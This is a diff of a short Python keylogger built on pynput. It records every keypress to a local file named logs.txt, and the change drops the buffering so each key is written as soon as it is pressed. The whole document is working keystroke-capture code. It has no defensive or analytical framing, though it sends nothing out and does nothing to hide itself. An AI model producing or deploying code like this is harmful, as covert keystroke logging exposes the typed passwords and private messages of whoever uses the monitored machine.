@@ -1,7 +1,5 @@
 from pynput.keyboard import Key, Listener
 
-word_counts = 0
-keys = []
 
 # on_press(key)
 # @paramters: key
@@ -10,25 +8,22 @@ keys = []
 
 
 def on_press(key):
-    global word_counts, keys
-    keys.append(key)
-    word_counts += 1
     print(f'{key} pressed')
-    if word_counts >= 5:
-        word_counts = 0
-        write_file(keys)
-        keys = []
+    write_file(key)
+
+# write_file(key
+# @parameters: key
+# @return: void
+# Writes the key pressed onto a file
 
 
-def write_file(key_arr):
+def write_file(key):
     with open("logs.txt", "a") as f:
-        for key in key_arr:
-            ke = str(key).replace("'", "")
-            if ke.find("space") > 0:
-                f.write('\n')
-            # Finding other Keys
-            if ke.find("Key") == -1:
-                f.write(ke)
+        ke = str(key).replace("'", "")
+        if ke.find("space") > 0:
+            f.write('\n')
+        if ke.find("Key") == -1:
+            f.write(ke)
 
 
 def on_release(key):
